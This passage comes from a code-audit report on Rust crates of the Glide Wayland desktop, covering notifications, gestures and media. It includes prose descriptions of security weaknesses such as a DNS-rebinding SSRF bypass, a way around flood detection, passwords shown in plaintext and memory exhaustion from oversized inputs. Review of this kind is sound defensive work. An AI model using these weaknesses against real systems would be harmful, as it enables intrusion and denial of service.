1. **Cross-client collision and false rejection in duplicate flood detection**
   - **Location**: `crates/glide-notify/src/server.rs:194-206`, `crates/glide-notify/src/model.rs:113-119`
   - **Description**: In `Service::notify`, rate-limiting and flood detection relies on a single global state slot `inner.last: Option<(Notification, Instant)>`:
     `if let Some((previous, at)) = inner.last.as_ref() && at.elapsed() < FLOOD_WINDOW && previous.is_duplicate_of(&notification) { return Err(zbus::fdo::Error::Failed("created too many similar notifications in quick succession".to_string())); }`
     However, `Notification::is_duplicate_of` compares only `summary`, `body`, `app_name`, `desktop_entry`, and `actions`, completely omitting `self.sender == other.sender`. If two independent client processes (such as two background CLI scripts or build hooks running `notify-send "Done"`) post notifications with identical summaries and empty `app_name`/`desktop_entry` within 1 second of each other, the second client's notification is rejected with a D-Bus error, falsely treating independent processes as duplicate floods. Furthermore, because `inner.last` is a single global slot, a single malicious sender alternating between two messages (`A`, `B`, `A`, `B`) every 10 milliseconds completely bypasses duplicate detection because each message overwrites `inner.last`.
2. **Hardcoded `secret: false` masks security context for inline replies**
   - **Location**: `crates/glide-notify/src/server.rs:160-165`, `crates/glide-notify/src/model.rs:62-68`
   - **Description**: When constructing an inline reply action for an incoming notification in `Service::notify`, `secret: false` is unconditionally hardcoded:
     `let reply = reply_label.map(|label| Reply { key: crate::model::ACTION_INLINE_REPLY.to_string(), label, placeholder: hints::string(&hint_map, "x-kde-reply-placeholder-text"), secret: false });`
     Standard FreeDesktop / KDE notification specifications define boolean hints `x-kde-reply-secret` or `x-kde-reply-password` for sensitive inputs (e.g. Wi-Fi passwords, SSH passphrases, PINs). Downstream UI consumers (`glide-topbar` and `glide-compositor/src/agent_prompt.rs`) inspect `reply.secret` to mask typed input characters with dots. Because `glide-notify` ignores these hints and hardcodes `secret: false`, passwords and credentials entered into inline replies generated by external D-Bus clients are echoed in plaintext on screen.
3. **Complete omission of standard FreeDesktop image hints (`image-data`, `image-path`) despite advertising `"icon-static"`**
   - **Location**: `crates/glide-notify/src/server.rs:153-188`, `crates/glide-notify/src/model.rs:284-298`
   - **Description**: `capabilities()` advertises `"icon-static"` (line 289), signaling to client applications that the notification server supports image and icon data payloads. However, `Service::notify` only extracts `app_icon: String` from the method parameter and drops all FreeDesktop image hints from `hint_map`: `image-data` (type `(iiibiiay)` raw pixel buffers), `image_data`, `icon_data`, and `image-path` / `image_path` (file paths to image assets). Modern Linux applications (e.g. media players sending album art, screenshot tools sending image thumbnails, instant messengers sending user avatars) transmit notification imagery via `image-data` or `image-path` while leaving `app_icon` blank or set to a generic icon name. In `glide-notify`, these image payloads are discarded, leaving notifications without visual thumbnail previews.
4. **Unhandled URI decoding and path component stripping in sound file hints**
   - **Location**: `crates/glide-notify/src/hints.rs:43-47`
   - **Description**: In `hints::sound()`, file URIs are processed as `Sound::File(file.strip_prefix("file://").unwrap_or(file).to_string())`. If a client passes a standard `file://` URI containing percent-encoded characters (such as spaces encoded as `%20`, or UTF-8 escape sequences like `file:///home/user/Audio%20Files/alert.oga`), `strip_prefix` leaves the literal `%20` in the resulting path. Downstream file resolution in `glide-compositor/src/sound.rs:37` performs `PathBuf::from(path).is_file()`, which searches for a literal `%20` file on disk and fails, causing sound playback to fail silently. Additionally, URIs with an explicit host authority (e.g. `file://localhost/path`) produce a relative path `localhost/path` that fails the downstream `path.is_absolute()` check.

##### AGENTS.md Trap
1. **Blocking event loop via synchronous D-Bus signal emission in `NotifyHandle` (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-notify/src/server.rs:263-292`
   - **Description**: `AGENTS.md` § 7 warns: *"Blocking the event loop. Command::output(), X11 round trips, file reads of client-supplied paths and D-Bus calls belong on a worker thread."* `NotifyHandle` wraps a `zbus::blocking::Connection`. Its public methods `closed()`, `invoked()`, and `replied()` call `self.emit()`, which executes `self.connection.send(&message)`. These methods are called directly on the compositor's main thread and event loop (e.g., inside `glide-topbar/src/notifications.rs:974` on timer expiry, and `notifications.rs:990` on user interaction). Because `zbus::blocking::Connection::send` performs synchronous socket writes, if the D-Bus daemon is under heavy load or its socket buffer is saturated, `send()` blocks the compositor's main event loop, causing frame drops or visual freezes.

##### Code Health
1. **Unbounded in-memory tables for notifications and inhibitors**
   - **Location**: `crates/glide-notify/src/server.rs:40-41, 49-56, 74-83`
   - **Description**: `Inner::live` (`HashMap<u32, String>`) and `Inner::inhibitors` (`HashMap<u32, Held>`) have no upper bounds or per-client quotas. A misbehaving or malicious client can call `Notify` or `Inhibit` in a tight loop to insert unbounded entries into memory. In `Inner::allocate()`, ID generation performs a linear scan `while self.live.contains_key(&id) { id = id.checked_add(1)... }`, whose search latency degrades as `live` grows. Similarly, `Inner::hold()` repeatedly scans `cookie == 0 || self.inhibitors.contains_key(&cookie)`. Adding capacity bounds and per-sender quotas would prevent resource exhaustion.
2. **Unbounded string allocation in `sanitize_body` and `plain_text`**
   - **Location**: `crates/glide-notify/src/model.rs:147-192, 226-258`
   - **Description**: `sanitize_body` allocates `String::with_capacity(raw.len())` and decodes the entire input string regardless of length. It then calls `collapse(&out)`, which allocates another `String::with_capacity(text.len())`. Only at the end of `collapse` (lines 253-256) does it check `if out.chars().count() > MAX_BODY_CHARS` and truncate to 599 characters. If a client sends a 50 MB notification body over D-Bus, `sanitize_body` allocates over 100 MB of heap memory and processes tens of millions of characters across multiple passes, only to discard 99.998% of it. Clamping the input length up front (e.g. limiting parsing to the first ~2,048 bytes) would prevent CPU starvation and excessive heap churn.
3. **Redundant `OwnedValue.clone()` allocations in `hints::string` and `hints::boolean`**
   - **Location**: `crates/glide-notify/src/hints.rs:8-15`
   - **Description**: In `hints::string()`, `String::try_from(value.clone()).ok()` creates a deep heap clone of the entire `OwnedValue` variant simply to extract a string reference. Similarly, `hints::boolean()` calls `bool::try_from(value.clone()).ok()`. Borrowing and matching against `Value::Str` or using `Value::downcast_ref` (and matching `Value::Bool` for booleans) avoids cloning `OwnedValue` variants on every hint lookup.
4. **Non-finite floating-point numbers in `hints::integer` produce saturated sentinel values**
   - **Location**: `crates/glide-notify/src/hints.rs:28`
   - **Description**: In `hints::integer()`, `Value::F64(inner) => Some(inner.round() as i64)` converts floating-point hints to integers. If a client transmits `f64::NAN`, `f64::INFINITY`, or `-f64::INFINITY`: `NaN as i64` evaluates to `0`, `+Inf as i64` saturates to `i64::MAX`, and `-Inf as i64` saturates to `i64::MIN`. These non-finite values are returned as valid integer hints (`Some(0)`, `Some(i64::MAX)`, `Some(i64::MIN)`) rather than being rejected as invalid. Guarding with `if inner.is_finite() { Some(inner.round() as i64) } else { None }` ensures invalid floats are discarded.
5. **Missing `Eq` derive on `Notification`**
   - **Location**: `crates/glide-notify/src/model.rs:80`
   - **Description**: `Notification` derives `Debug, Clone, Default, PartialEq`, but omits `Eq`. None of its 17 fields contain floating-point numbers (`u32`, `String`, `Vec<Action>`, `bool`, `Option<Reply>`, `Urgency`, `Option<Duration>`, `Sound` all implement `Eq`). Deriving `Eq` enables `Notification` to be used in hash sets, b-tree collections, or generic contexts requiring full structural equivalence.
6. **Redundant Mutex locking on every system `NameOwnerChanged` signal**
   - **Location**: `crates/glide-notify/src/server.rs:338-346`
   - **Description**: `watch_inhibitor_owners()` listens to `NameOwnerChanged` for all connections on the user session bus. For every process exit across the entire desktop session, line 345 unconditionally acquires the `inner` Mutex lock to execute `release_owner(&inner, &sink, args.name().as_str())`. In normal desktop operation, `self.inhibitors` is empty the vast majority of the time. Checking whether inhibitors are currently held before acquiring the lock (e.g. via an `AtomicBool` flag) would eliminate mutex contention with the notification dispatch thread during high bus traffic.
7. **Inaccurate capability advertisement for `"body-markup"`**
   - **Location**: `crates/glide-notify/src/model.rs:284-298`
   - **Description**: `capabilities()` advertises `"body-markup"` (line 288). However, `sanitize_body()` strips all HTML/XML tags (e.g. `<b>`, `<i>`, `<u>`, `<a>`, `<span>`), reducing the body to unformatted plain text. The test `only_honoured_capabilities_are_advertised` asserts that unhonoured features are excluded, yet `"body-markup"` is advertised even though the compositor never displays rich text styling. Advertising `"body-markup"` signals to client applications that formatting tags will be visually rendered, which can cause clients to omit plain-text fallbacks or generate broken formatting expectations.

---

### 9. `glide-gestures` (1,246 lines)

#### Summary
`glide-gestures` is the gesture recognition, tracking, physics, and state-machine engine for the Glide Wayland compositor, located at `crates/glide-gestures`. Formerly embedded in `glide-compositor/src/gestures.rs`, it was extracted into a dedicated crate on 2026-10-29. It translates multi-finger touchpad swipes, touch screen edge swipes, and pinch gestures into high-level shell and window actions (`Workspace`, `Overview`, `Launcher`, `AppSwitch`, `Maximize`, `Minimize`, `Restore`).

The crate provides several core subsystems:
1. `GestureConfig`: Deserializable configuration mirrored from `glide.toml` controlling finger thresholds (3 vs 4 fingers), gesture role assignment (`SwipeRole::Shell` vs `SwipeRole::Windows`), natural scrolling inversion, touch edge activation, pinch-to-zoom claims, and sensitivity scaling.
2. `VelocityTracker`: Rolling timestamp-based velocity estimator tracking gesture speed across a sliding microsecond time window (`Duration::from_millis(100)`).
3. `WorkspaceSwipeState` and Boundary Rubber-Banding: State machine managing interactive dynamic workspace transitions (`WorkspaceSwipePhase::Tracking` vs `WorkspaceSwipePhase::Settling`), asymptotic non-linear boundary rubber-banding (`calculate_rubber_band`, `raw_displacement`), progress normalization, and interruption catching (`catch`).
4. `TouchpadGestureTracker`: Axis disambiguation state machine locking 2D finger motion onto either horizontal workspace swiping or vertical shell elevation (Desktop → Overview → Launcher).
5. Touchscreen Edge Swiping (`touch_edge`, `touch_units`, `EdgeSwipe`): Border proximity detection (`TOUCH_EDGE = 16.0px`) and drag displacement calculations for pulling system panels (Quick Settings, Notification Center) or triggering shell gestures from bezel touch contacts.
6. Gesture Practice Engine (`Practice`): Live simulation and diagnostics harness producing IPC `GestureSample` events for the Settings application gesture practice visualizer (`glide-settings`).

The codebase is written in 100% safe Rust with zero `unsafe` blocks and complies strictly with `AGENTS.md` § 6 (only one permitted `#[allow(clippy::struct_excessive_bools)]` comment is present). `cargo check -p glide-gestures`, `cargo clippy -p glide-gestures --all-targets -- -D warnings`, and all 28 unit tests pass cleanly. Deep line-by-line static inspection identified 4 Bugs, 1 AGENTS.md Trap, and 7 Code Health issues covering `Instant::duration_since` panic risks under timestamp anomalies, velocity estimation fencepost overestimation, un-clamped shell settlement coordinates, configuration masking in pinch practice updates, and corner ambiguity in touch edge recognition.

#### Findings

##### Critical
None identified.

##### Bug
1. **Unchecked `Instant::duration_since` panic hazard under non-monotonic or jittered timestamps**
   - **Location**: `crates/glide-gestures/src/lib.rs:142, 151`
   - **Description**: In `VelocityTracker::push`, the sample pruning loop calls `now.duration_since(front.timestamp) > self.window_duration`. In the Rust standard library, `Instant::duration_since` unconditionally panics if the argument is later than `self` (`"panicked at 'supplied instant is later than self'"`). Similarly, in `VelocityTracker::velocity`, line 151 calls `newest.timestamp.duration_since(oldest.timestamp)`. If input events arrive out of order, or if `TouchpadGestureTracker::instant_for` calculates timestamps with clock jitter or device reconnects where `now < front.timestamp`, this unhandled `duration_since` triggers an immediate panic inside the compositor's main input event loop. Using `saturating_duration_since` (or `checked_duration_since`) ensures safe, panic-free duration calculations.
2. **Fencepost error in velocity estimation causing 2x initial velocity overestimation**
   - **Location**: `crates/glide-gestures/src/lib.rs:147-156, 478-482`
   - **Description**: In `VelocityTracker::velocity`, elapsed time `dt` is computed as `newest.timestamp.duration_since(oldest.timestamp)`. For $N$ samples, there are $N-1$ time intervals between `oldest` and `newest`. However, `self.samples.iter().map(delta).sum::<f64>()` sums the displacements of all $N$ samples, including `oldest.delta_x`/`delta_y`. When a gesture begins, `TouchpadGestureTracker::update` pushes the first event's full displacement as sample 0. When the second update arrives at $\Delta t$, `dt = t_1 - t_0`, but the sum adds both `sample[0]` and `sample[1]`, calculating double the actual physical velocity (e.g. $(d_0 + d_1) / \Delta t \approx 2v$ for constant velocity). Even across 10 samples (as observed in unit test `velocity_follows_event_timestamps_not_arrival_time` where $-2000$ px/s produces $-2222$ px/s, an 11% error that required wide assertion tolerances), flick velocity is systematically inflated, causing gestures with small flicks to prematurely cross commit thresholds (`velocity_p.abs() > 0.5` or `velocity_up > 0.5`).
3. **Unbounded and un-clamped return coordinate in `decide_shell_settlement`**
   - **Location**: `crates/glide-gestures/src/lib.rs:277-295`
   - **Description**: `decide_shell_settlement` properly clamps to `SHELL_DESKTOP..=SHELL_LAUNCHER` when `cancelled` is true (line 279: `return base.round().clamp(SHELL_DESKTOP, SHELL_LAUNCHER);`). However, the normal settlement return path (line 294: `if up { floor + 1.0 } else { floor }`) performs no boundary clamping. If `position < 0.0` (for example, if a downward pull is performed from Desktop `0.0`), `position.floor()` evaluates to `-1.0`. `floor = (-1.0).min(1.0)` evaluates to `-1.0`. If downward velocity is present or downward displacement is insufficient to trigger `up`, line 294 returns `-1.0`, which violates the invariant that shell position is bounded within `[SHELL_DESKTOP, SHELL_LAUNCHER]` (`[0.0, 2.0]`).
4. **`Practice::pinch_update` hardcodes `&GestureConfig::default()` instead of user configuration**
   - **Location**: `crates/glide-gestures/src/lib.rs:658`
   - **Description**: In `Practice::pinch_update`, the current gesture action and progress reading is evaluated via:
     `let (action, progress) = self.reading(&GestureConfig::default());`
     Unlike `swipe_update` (line 647) and `end` (line 663) which accept and respect the caller's `&GestureConfig`, `pinch_update` creates a temporary default configuration on the stack on every pinch update event. If the user or compositor has customized gesture settings (such as sensitivity or feature toggles), `pinch_update` ignores the runtime configuration.

##### AGENTS.md Trap
1. **Un-resettable timestamp epoch in `TouchpadGestureTracker` risks stale event loop timing (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-gestures/src/lib.rs:436, 473-476`
   - **Description**: `AGENTS.md` § 7 warns against state machine leakage and un-retired state across event loop cycles. `TouchpadGestureTracker` stores `epoch: Option<(u64, Instant)>`, which records the base timestamp pair on the first received event. However, `TouchpadGestureTracker` lacks any `reset()` method to clear `epoch`, `accum_dx`, `accum_dy`, and `velocity`. If a tracker instance is reused or retained across distinct gesture sequences in the event loop, `instant_for` calculates time elapsed from the prior gesture's epoch. If subsequent events have lower microsecond values (e.g. from device reconnection, driver reset, or multiple devices), `event_micros.saturating_sub(base_micros)` saturates to 0, locking all subsequent event timestamps to `base` and freezing the velocity tracker.

##### Code Health
1. **Missing orthogonal axis disambiguation in `EdgeSwipe::pulled_by`**
   - **Location**: `crates/glide-gestures/src/lib.rs:382-390`
   - **Description**: `EdgeSwipe::pulled_by` evaluates only the 1D displacement along the pull axis (e.g. `dx >= distance` for `TouchEdge::Left`). If a user touches near the screen bezel (within 16 px) and scrolls vertically inside a scrollable client (such as a terminal, document, or web browser), any incidental horizontal wobble exceeding 24 px (`TOUCH_PULL / 2.0`) causes the compositor to claim the edge swipe, cancel touch on the client application, and hijack the gesture into a workspace transition even though the dominant user motion was vertical (`|dy| >> |dx|`). Adding an orthogonal axis check (`|dx| > |dy|` for Left/Right, and `|dy| > |dx|` for Top/Bottom) would prevent false-positive gesture claims.
2. **Corner ambiguity and vertical edge shadowing in `touch_edge`**
   - **Location**: `crates/glide-gestures/src/lib.rs:342-358`
   - **Description**: In `touch_edge`, `TouchEdge::Bottom` and `TouchEdge::Top` are evaluated before `TouchEdge::Left` and `TouchEdge::Right`. In the four 16×16px corner zones of an output, vertical edges unconditionally shadow horizontal edges. A horizontal swipe initiated from the left or right edge within 16 px of the top or bottom screen boundary is misidentified as a Top or Bottom edge gesture (triggering topbar popovers or overview instead of workspace switching). Comparing proximity (`min(x, w - x)` vs `min(y, h - y)`) or explicitly discarding corner zones would eliminate directional ambiguity.
3. **Lack of `reset` method on `TouchpadGestureTracker`**
   - **Location**: `crates/glide-gestures/src/lib.rs:429-494`
   - **Description**: While `VelocityTracker` implements `reset()` (line 168), `TouchpadGestureTracker` provides no `reset()` method to clear `accum_dx`, `accum_dy`, `kind`, and `epoch`. Callers must allocate a new tracker instance for every gesture, preventing struct reuse and increasing allocation churn in high-frequency input loops.
4. **`GestureAction` directional bias to `NextWorkspace` at zero displacement**
   - **Location**: `crates/glide-gestures/src/lib.rs:740`
   - **Description**: In `Practice::reading`, when `tracker.kind` is `GestureKind::Workspace`, the reported action is chosen via `if progress >= 0.0 { GestureAction::NextWorkspace } else { GestureAction::PreviousWorkspace }`. When progress is exactly 0.0 (e.g. at gesture start before displacement occurs, or when horizontal movement has returned to the origin), `NextWorkspace` is unconditionally chosen. Returning `GestureAction::None` when `progress.abs() < f64::EPSILON` would provide symmetric and unbiased feedback.
5. **Inconsistent receiver passing conventions on `Copy` types**
   - **Location**: `crates/glide-gestures/src/lib.rs:55, 60, 65, 78, 83, 88, 381, 392, 398`
   - **Description**: `GestureConfig` implements `Copy`, but methods like `fingers(&self)`, `role(&self)`, `claims(&self)`, and `delta(&self)` take `&self` by reference rather than `self` by value. Following Rust API Guidelines (C-VAL), methods on small `Copy` configuration structs should adopt a consistent value receiver convention (`self`).
6. **Unbounded displacement accumulation during boundary rubber-banding**
   - **Location**: `crates/glide-gestures/src/lib.rs:533-536`
   - **Description**: In `WorkspaceSwipeState::update`, when at a workspace boundary, `raw_delta_x` is allowed to accumulate up to `4.0 * SWIPE_DISTANCE` (1,680 px). Due to asymptotic compression in `calculate_rubber_band`, dragging 1,500 px past the edge compresses to ~98 px of visual offset; however, releasing or reversing requires the user to pull back the entire 1,500 px before the workspace responds to movement in the opposite direction.
7. **Zero unit test coverage for non-finite floating-point inputs (`NaN` / `Infinity`)**
   - **Location**: `crates/glide-gestures/src/lib.rs:766-1246`
   - **Description**: While the 28 unit tests thoroughly verify nominal swipes, flicks, and rubber-banding, there are zero unit tests validating behavior when `NaN` or `Infinity` is passed into `WorkspaceSwipeState::update`, `calculate_rubber_band`, `decide_shell_settlement`, or `VelocityTracker::push`. Adding defensive tests ensures numerical edge cases do not propagate NaN into layout or compositor coordinates.

---

### 10. `glide-media` (1,248 lines)

#### Summary
`glide-media` is the MPRIS media player controller, player discovery engine, and cover art caching subsystem for the Glide Wayland desktop environment, located at `crates/glide-media`. It provides the backend services consumed by `glide-compositor` to populate the topbar inline Media Player widget, handle multimedia transport keys (Previous, Play/Pause, Next), display rich cover art in popovers, and synchronize seek/progress status with active session media players.

The crate is architected across four primary modules:
1. `model.rs`: Core domain models and pure transformation helpers (`Track`, `Playback`, `Command`, `MediaEvent`, `seek_target`, `identity_from_bus`, `player_icon_candidates`, `better_candidate`, `artists_to_line`, and `local_art_path`).
2. `client.rs`: D-Bus client thread managing the MPRIS session connection via `zbus`. It encapsulates `MediaHandle` (thread-safe, non-blocking request sender), coalesces seek bursts, issues asynchronous player control messages (`PlayPause`, `Seek`, `SetPosition`, `PauseAll`), and executes a periodic 500ms discovery and state synchronization loop (`run_worker`).
3. `art.rs`: Dedicated background cover art fetcher thread (`"glide-art"`), local disk cache manager (`~/.cache/glide/media-art/`), URL scheme validation, SSRF mitigation filters (`local_ip`, `local_host`, `resolves_locally`), and cache size pruning (`prune`, max 128 items).
4. `lib.rs`: Public API surface re-exporting key types and consumers.

The codebase is written in 100% safe Rust with zero `unsafe` blocks. It strictly complies with `AGENTS.md` § 6 (zero comments in `src/`, with only permitted clippy justification comments in test files). `cargo check -p glide-media`, `cargo clippy -p glide-media --all-targets -- -D warnings`, and all 36 unit/integration tests pass cleanly. Deep line-by-line static analysis identified 4 Bugs, 1 AGENTS.md Trap, and 7 Code Health issues covering candidate player selection stickiness, float NaN conversion hazards, SSRF DNS rebinding windows, unchecked MIME/magic-byte caching, and high-frequency D-Bus polling.

#### Findings

##### Critical
None identified.

##### Bug
1. **Candidate selection in `choose()` ignores `last`, breaking player stickiness and causing arbitrary player switching**
   - **Location**: `crates/glide-media/src/client.rs:214-220, 258`, `crates/glide-media/src/model.rs:139-151`
   - **Description**: `better_candidate(current: Option<&Track>, candidate: &Track)` was explicitly designed to determine whether a newly evaluated `candidate` should supersede the active `current` track. This design is corroborated by the parameter name `current`, line 143 (`if current.bus == candidate.bus { return true; }`), and the test `the_current_player_always_updates_itself`. However, in `client.rs:219`:
     ```rust
     fn choose(connection: &zbus::blocking::Connection) -> Option<Track> {
         list_players(connection)
             .iter()
             .filter_map(|bus| read_track(connection, bus))
             .filter(|track| track.status.is_active())
             .fold(None, |best, track| if better_candidate(best.as_ref(), &track) { Some(track) } else { best })
     }
     ```
     `choose()` does not accept or consider the previous active track (`last`). Instead, it folds from `None` over the results of `list_players`. Because `list_players` returns distinct bus names, `best.bus == track.bus` is never true in production (making line 143 dead code outside tests). More critically, candidate selection is dictated purely by the arbitrary hash-table order returned by the D-Bus daemon's `ListNames`. If a user pauses Player A (e.g. Spotify) while another background player B (e.g. Chromium) is also paused, and Chromium happens to appear earlier in `ListNames`, Chromium is adopted and Spotify is discarded (`better_candidate` returns `false` when comparing two paused players), despite Spotify being the user's active session player in `last`. Similarly, if two players are playing simultaneously, whichever player appears earlier in `ListNames` locks out the second player indefinitely (`(Playback::Playing, _) => false`), even if the user just started playing the second player.
2. **Unchecked `f32::NAN` in `seek_target` causes unconditional `Duration::from_secs_f64` panic**
   - **Location**: `crates/glide-media/src/model.rs:84-91`
   - **Description**: In `seek_target`, fractional seek progress is clamped and converted:
     ```rust
     let clamped = f64::from(fraction.clamp(0.0, 1.0));
     Some(Duration::from_secs_f64(length.as_secs_f64() * clamped))
     ```
     Per IEEE-754 and Rust standard library semantics, `f32::clamp(min, max)` returns `NaN` when `self` is `NaN`. As a result, `clamped` becomes `f64::NAN`, the product `length.as_secs_f64() * clamped` evaluates to `NaN`, and `Duration::from_secs_f64(NaN)` panics unconditionally with `"can not convert float to Duration: NaN"`. While the caller in `client.rs:69` (`seek_arguments`) checks `!fraction.is_finite()`, `seek_target` is a `pub(crate)` helper exposed across the crate without internal validation. Any direct call with `f32::NAN` (e.g. from UI sliders or IPC commands bypassing `seek_arguments`) triggers a crash.
3. **Time-of-Check to Time-of-Use (TOCTOU) DNS rebinding SSRF vulnerability in remote cover art fetching**
   - **Location**: `crates/glide-media/src/art.rs:68-78, 180-184`
   - **Description**: `download(agent, url, dir, target)` executes a pre-flight SSRF check on line 181:
     `anyhow::ensure!(!resolves_locally(url), "cover art that points into the local network is not fetched");`
     `resolves_locally` resolves the hostname via `(host.as_str(), port).to_socket_addrs()` and verifies that all resolved IP addresses are non-local. However, line 182 immediately calls `let mut response = agent.get(url).call()?;`. `ureq::Agent` performs its own separate DNS resolution during socket connection. This introduces a TOCTOU DNS rebinding vulnerability: an attacker providing a domain with DNS TTL=0 can return a valid public IP address during `resolves_locally()`, followed by `127.0.0.1` or internal intranet IPs (`192.168.x.x`, `10.x.x.x`) during `agent.get(url).call()`. Because `ureq` is passed the raw URL rather than connecting to the pre-verified socket address, the HTTP request escapes the private network filter and connects to local services.
4. **Cover art cache stores arbitrary non-image payloads up to 8 MiB without Content-Type or magic byte verification**
   - **Location**: `crates/glide-media/src/art.rs:182-188`
   - **Description**: `download` reads up to 8 MiB (`ART_MAX_BYTES`) of raw HTTP response body directly into memory and writes it to disk as a cached cover art file. It performs zero validation of the HTTP `Content-Type` header (e.g. ensuring `image/jpeg`, `image/png`, `image/webp`) and zero inspection of magic byte headers (`\x89PNG`, `\xff\xd8\xff`, `RIFF...WEBP`). Any remote URL advertised by a rogue or misconfigured MPRIS player can deliver HTML pages, JSON error responses, scripts, or arbitrary binary files, which `glide-media` caches in `$XDG_CACHE_HOME/glide/media-art/` and serves as a `file://` URI to the compositor.

##### AGENTS.md Trap
1. **High-frequency synchronous D-Bus polling (`ListNames` + `GetAll` per player every 500ms) without signal matching (`AGENTS.md` § 7)**
   - **Location**: `crates/glide-media/src/client.rs:206-220, 237-255`
   - **Description**: `AGENTS.md` § 7 warns against "Blocking the event loop" and background poll contention. While `glide-media` offloads operations to a dedicated background worker thread (`"glide-mpris"`), every 500ms (`SCAN_INTERVAL`) the worker synchronously invokes:
     1) `DBusProxy::list_names()` (querying the entire bus registry).
     2) For *every* MPRIS player on the bus, a synchronous `org.freedesktop.DBus.Properties.GetAll` roundtrip on `org.mpris.MediaPlayer2.Player`.
     3) A synchronous `GetAll` roundtrip on `org.mpris.MediaPlayer2` root interface.
     In a desktop environment running multiple players or web browsers with multiple media tabs (each tab creating a distinct `org.mpris.MediaPlayer2.chromium.instance*` bus name), this generates 10–20+ synchronous IPC roundtrips per second continuously, even when playback is stopped or idle, wasting CPU cycles and battery. Furthermore, if any third-party player hangs or becomes unresponsive, each `properties()` call blocks for up to `METHOD_TIMEOUT` (2 seconds), stalling the worker thread and delaying user transport requests (`PlayPause`, `Seek`, `Next`). Standard MPRIS clients register signal matches for `PropertiesChanged` and `NameOwnerChanged`, polling `Position` only while a player is in the `Playback::Playing` state.

##### Code Health
1. **Missing `DesktopEntry` causes recurring D-Bus `GetAll` roundtrip on every 500ms scan tick**
   - **Location**: `crates/glide-media/src/client.rs:199-204`
   - **Description**: In `desktop_entry()`, the cached entry is only reused `if let Some(last) = last.filter(|last| last.bus == bus && !last.desktop_entry.is_empty())`. If a media player does not implement `DesktopEntry` on `ROOT_INTERFACE` (common for CLI players like `mpv`, lightweight bridges, or web player integrations), `desktop_entry` is empty. Because `!last.desktop_entry.is_empty()` evaluates to `false`, the cache is bypassed and `desktop_entry()` issues a redundant synchronous D-Bus `GetAll` call on `org.mpris.MediaPlayer2` on every 500ms tick for the entire duration of playback. The absence of `DesktopEntry` should be cached per bus name.
2. **Absolute seek requests silently dropped for players using non-ObjectPath track identifiers**
   - **Location**: `crates/glide-media/src/client.rs:68-76`
   - **Description**: In `seek_arguments`, line 73 requires `let path = ObjectPath::try_from(track.track_id.clone()).ok()?;`. While `read_track` (line 184) leniently accepts string track IDs when players do not provide a D-Bus ObjectPath (such as Spotify URIs `spotify:track:...` or numeric strings), `seek_arguments` strictly rejects them. As a result, absolute seeks (`MediaHandle::seek`) are silently dropped. In contrast, relative seeks (`MediaHandle::seek_by` invoking MPRIS `Seek(Offset)`) do not require a `TrackId` object path. Implementing a relative seek fallback (`target - position`) when `track_id` is not an ObjectPath would preserve seek functionality across all players.
3. **Missing `Metadata` property causes `read_track` to discard entire active player**
   - **Location**: `crates/glide-media/src/client.rs:172`
   - **Description**: In `read_track`, `let metadata = Properties::try_from(player.get("Metadata")?.try_clone().ok()?).ok()?;` aborts with `?` if the `Metadata` property is absent from the player's property map. For internet radio streams, podcasts, or minimal audio players that do not publish metadata dictionaries, `read_track` returns `None`. Consequently, the player is completely invisible to Glide, even if `PlaybackStatus == "Playing"` and transport controls (`can_go_next`, `position`, `status`) are fully valid. Falling back to an empty metadata dictionary would allow the player to be controlled with title `"Unknown"`.
4. **Incomplete IP address sanitization in `local_ip` omitting multicast, documentation, and IPv4-compatible addresses**
   - **Location**: `crates/glide-media/src/art.rs:36-57`
   - **Description**: `local_ip` filters private, loopback, link-local, unspecified, broadcast, and CGNAT ranges. However, it omits:
     - IPv4 multicast: `224.0.0.0/4` (`ip.is_multicast()`).
     - IPv6 multicast: `ff00::/8` (`first & 0xff00 == 0xff00`).
     - IPv4 documentation subnets: `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`.
     - Deprecated IPv4-compatible IPv6 addresses (`::a.b.c.d`), which `ip.to_ipv4_mapped()` does not detect.
     Adding `ip.is_multicast()` and documentation ranges enhances defense-in-depth against SSRF.
5. **Trailing underscore leakage in `identity_from_bus` for underscore-delimited instance suffixes**
   - **Location**: `crates/glide-media/src/model.rs:106, 127`
   - **Description**: In `identity_from_bus`, `tail` is processed via `bus_head(name).trim_matches('-')`. In contrast, `player_icon_candidates` trims both `'-'` and `'_'` via `trim_matches(['-', '_'])`. For bus names containing underscore delimiters prior to instance identifiers (e.g. `org.mpris.MediaPlayer2.player_instance1`), `bus_head` returns `"player_"`. Because `identity_from_bus` only trims hyphens, it outputs `"Player_"`, leaking a dangling underscore into the user-facing title. Both functions should trim `['-', '_']`.
6. **Interrupted or failed `.part` downloads leak on disk and distort cache pruning accounting**
   - **Location**: `crates/glide-media/src/art.rs:186-188, 196-202`
   - **Description**: `download` writes partial data to `target.with_extension("part")` before renaming to `target`. If `std::fs::rename` fails or an error occurs during write, the `.part` file remains in the cache directory. In `prune()`, `entry.metadata().ok().filter(Metadata::is_file)` counts all files in `dir`, including abandoned `.part` files, causing valid cached art files to be prematurely pruned while obsolete partial files remain on disk indefinitely. Pruning should filter by hash filename and clean up stale `.part` files.
7. **Unbounded `mpsc::channel` in `MediaHandle` creates memory growth hazard under stalled worker thread**
   - **Location**: `crates/glide-media/src/client.rs:30, 228`
   - **Description**: `start()` initializes communication using an unbounded `mpsc::channel()`. While `coalesce()` collapses redundant seeks once drained by the worker, if the `"glide-mpris"` worker thread stalls due to D-Bus timeouts on hung players, high-frequency seek scrubbing or transport requests from UI sliders accumulate unbounded in the channel buffer. Using a bounded channel or a fixed-capacity queue with drop-oldest semantics would prevent memory growth during IPC stalls.

---

### 11. `glide-iced` (1,284 lines)

#### Summary
`glide-iced` is an integration and theme bridge crate located at `crates/glide-iced`. It adapts the Iced GUI framework (version 0.14) to the Meridian design system specifications (`AGENTS.md` § 8, `design/MERIDIAN_DESIGN_SPEC.md`). It provides custom widget decorators (`Decorated` wrapping buttons, text inputs, containers, surfaces with shadows, and scaled elements), a custom `Text` widget with advanced OpenType layout and tracking support via `cosmic-text`, vector and raster glyph rendering (`Glyph`), a font database management subsystem (`font`), and strict Meridian design token styling bridges (`Paint`, `style`).

The crate is structured into 5 core modules:
1. `widgets.rs` (430 lines): Custom `Decorated` widget managing fluid micro-animations (hover, press scale, focus halo) using `glide_ui::Tween`, style blending (`blend`), surface elevation shadows (`surface`), and focus state traversals (`Focus`).
